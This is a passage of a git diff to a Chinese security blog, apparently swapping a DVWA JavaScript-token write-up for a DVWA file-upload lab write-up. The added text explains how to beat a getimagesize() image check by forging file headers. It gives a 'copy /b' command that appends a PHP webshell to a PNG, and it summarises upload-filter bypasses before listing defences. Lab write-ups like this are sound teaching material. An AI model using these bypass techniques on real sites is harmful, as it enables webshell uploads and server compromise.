+            // Yes!
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Invalid file
+        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;
+    }
 }
-function token_part_1(a, b) {
-    document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)
-}
-document.getElementById(&quot;phrase&quot;).value = &quot;&quot;;
-setTimeout(function() {
-    token_part_2(&quot;XX&quot;)
-}, 300);
-document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);
-token_part_1(&quot;ABCD&quot;, 44);</code></pre>
-<p>很明显这里获取token分为了三个部分，token_part_1、token_part_2和token_part_3。<br>操作步骤与之前差不多。<br><img src="13.png" alt="13"><br><img src="14.png" alt="14"><br>这里是token_part_2时的token，token_part_3是点击时才触发的，所以这样直接提交。<br><img src="15.png" alt="15"><br>可以看到这是最终的token值。</p>
-<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p>不要相信任何用户输入😂</p>
+?&gt;</code></pre>
+<p>这里进行了更严格的检查，<code>getimagesize( $uploaded_tmp )</code>这个函数返回结果中有文件大小和类型（即通过文件头来获取），绕过用这个函数来获取类型，从而判断是否是图片的化，仍然会存在问题，图片的文件头能被伪造。<br>虽然可以突破上传，但是上传的文件没有很好的利用途径，需要结合其他漏洞进行结合利用（利用文件包含漏洞，可以参考文件包含漏洞部分的学习）</p>
+<p>图片木马的制作： 方法1：直接伪造头部GIF89A<br>方法1.CMD: copy /b test.png + muma.php cccc.png<br>方法2.使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令</p>
+<p>这里可以利用windows下的copy来生成一个图片木马<br><img src="4.png" alt="4"><br>使用winhex看看<br><img src="5.png" alt="5"><br>可以看到，一句话已经拼接到了后面，这样就能绕过了</p>
+<h2 id="文件上传漏洞绕过思路汇总"><a href="#文件上传漏洞绕过思路汇总" class="headerlink" title="文件上传漏洞绕过思路汇总"></a>文件上传漏洞绕过思路汇总</h2><p>客户端检查<br>几乎等于摆设，通过抓包改包即可</p>
+<p>服务器端检查</p>
+<ul>
+<li>黑名单：尝试找到黑名单中的漏网之鱼，中间件的解析漏洞</li>
+<li>白名单：通常就需要使用到解析漏洞进行绕过</li>
+<li>文件完整性检查：文件头及相关信息检查，通过伪造文件头绕过</li>
+</ul>
+<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>不要在客户端实施上传限制策略</p>
+<p>通过服务器端对上传文件进行限制：</p>
+<ul>
+<li>进行多条件组合检查：比如文件的大小，路径，扩展名，文件类型，文件完整性</li>
+<li>对上传的文件在服务器上存储时进行重命名（制定合理的命名规则）</li>
+<li>对服务器端上传文件的目录进行权限控制（比如只读），限制执行权限带来的危害</li>
+</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 zjre@qq.com </span>
@@ -777,12 +868,12 @@ token_part_1(&quot;ABCD&quot;, 44);</code></pre>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Dvwa-JavaScript</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">647</span></p>
+    <p><span class="copy-title">文章标题:</span>Dvwa-FileUpload</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.6k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="ZJR">ZJR</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-03-30, 18:01:47</p>
-    <p><span class="copy-title">最后更新:</span>2020-03-30, 18:14:23</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/03/30/Dvwa-JavaScript/" title="Dvwa-JavaScript">http://zjr-g.github.io/2020/03/30/Dvwa-JavaScript/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-04, 18:01:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-10, 19:30:31</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/04/Dvwa-FileUpload/" title="Dvwa-FileUpload">http://zjr-g.github.io/2020/04/04/Dvwa-FileUpload/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
@@ -826,7 +917,7 @@ token_part_1(&quot;ABCD&quot;, 44);</code></pre>
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#aes加密','#base64','#ctf-web','#BruteForce','#CSPBypass','#CommandInject','#CSRF','#FileInclude','#FileUpload','#InsecureCAPTCHA','#JavaScript','#SQLInject','#WeakSessionIDs','#XSS','#file_incloude','#MySql_show','#Git','#MySql_select','#MySql_order by','#MySql_regexp','#MySql_where','#MySql_like','#MySql_concat','#MySql_function','#MySql_jion','#MySql_group by','#MySql_having','#MySql_subquery','#MySql_union','#MySql_insert','#MySql_update','#MySql_delete','#MySql_create','#MySql_alter','#SSIT','#zip','#Markdown','#hexo',],
+            'data': ['#base64','#ctf-web','#aes加密','#BruteForce','#CSPBypass','#CommandInject','#CSRF','#InsecureCAPTCHA','#FileInclude','#JavaScript','#FileUpload','#SQLInject','#XSS','#Git','#WeakSessionIDs','#file_incloude','#MySql_regexp','#MySql_show','#MySql_concat','#MySql_where','#MySql_like','#MySql_function','#MySql_subquery','#MySql_jion','#MySql_group by','#MySql_having','#MySql_insert','#MySql_update','#MySql_delete','#MySql_create','#MySql_alter','#SSIT','#MySql_select','#MySql_order by','#zip','#MySql_union','#Markdown','#hexo',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
